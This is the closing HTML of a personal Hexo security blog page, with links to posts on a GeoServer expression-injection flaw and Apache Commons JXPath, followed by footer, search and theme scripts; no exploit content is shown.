                <a href="/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="GeoServer表达式注入代码执行漏洞">
                        
                        <span class="card-title">GeoServer表达式注入代码执行漏洞</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/cve%E5%A4%8D%E7%8E%B0/" class="post-category">
                                    cve复现
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">java安全</span>
                    </a>
                    
                    <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">表达式注入</span>
                    </a>
                    
                    <a href="/tags/geoserver/">
                        <span class="chip bg-color">geoserver</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/07/08/Apache-Commons-JXPath/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Apache Commons JXPath">
                        
                        <span class="card-title">Apache Commons JXPath</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Life/" class="post-category">
                                    Life
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/java%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">java安全</span>
                    </a>
                    
                    <a href="/tags/apache-commons/">
                        <span class="chip bg-color">apache commons</span>
                    </a>
                    
                    <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
                        <span class="chip bg-color">表达式注入</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




                <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023-2024</span>
            
            <a href="/about" target="_blank">Yyjccc</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/yyjccc" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:yanyongjuyyj@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3393867490" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3393867490" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


                    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

                        <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

                            <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


                                <script
                                    src="/libs/materialize/materialize.min.js"></script>
                                <script src="/libs/masonry/masonry.pkgd.min.js"></script>
                                <script src="/libs/aos/aos.js"></script>
                                <script
                                    src="/libs/scrollprogress/scrollProgress.min.js"></script>
                                <script
                                    src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
                                <script src="/js/matery.js"></script>

                                

                                        

                                                

                                                    <script type="text/javascript">
                                                        // 只在桌面版网页启用特效
                                                        var windowWidth = $(window).width();
                                                        if (windowWidth > 768) {
                                                            document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
                                                        }
                                                    </script>
                                                    

                                                        <!-- 雪花特效 -->
                                                        
                                                            <script type="text/javascript">
                                                                // 只在桌面版网页启用特效
                                                                var windowWidth = $(window).width();
                                                                if (windowWidth > 768) {
                                                                    document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
                                                                }
                                                            </script>
                                                            

                                                                <!-- 鼠标星星特效 -->
                                                                
                                                                    <script type="text/javascript">
                                                                        // 只在桌面版网页启用特效
                                                                        var windowWidth = $(window).width();
                                                                        if (windowWidth > 768) {
                                                                            document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
                                                                        }
                                                                    </script>
                                                                    

                                                                        
                                                                            <script
                                                                                src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
                                                                            <script
                                                                                src="/libs/others/TencentCaptcha.js"></script>
                                                                            <button id="TencentCaptcha"
                                                                                data-appid="xxxxxxxxxx"
                                                                                data-cbfn="callback" type="button"
                                                                                hidden></button>
                                                                            

                                                                                <!-- Baidu Analytics -->

                                                                                    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

                                                                                        
                                                                                            <script
                                                                                                src="/libs/others/clicklove.js"
                                                                                                async="async"></script>
                                                                                            
                                                                                                
                                                                                                    <script async
                                                                                                        src="/libs/others/busuanzi.pure.mini.js"></script>
                                                                                                    

                                                                                                        

                                                                                                                

                                                                                                                        <!--腾讯兔小巢-->
                                                                                                                        
                                                                                                                                
                                                                                                                                    <script
                                                                                                                                        type="text/javascript"
                                                                                                                                        color="0,0,255"
                                                                                                                                        pointColor="0,0,255"
                                                                                                                                        opacity='0.7'
                                                                                                                                        zIndex="-1"
                                                                                                                                        count="99"
                                                                                                                                        src="/libs/background/canvas-nest.js"></script>
                                                                                                                                    

                                                                                                                                        

                                                                                                                                                    

                                                                                                                                                            
                                                                                                                                                                <script
                                                                                                                                                                    src="/libs/instantpage/instantpage.js"
                                                                                                                                                                    type="module"></script>
                                                                                                                                                                

    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>

</html>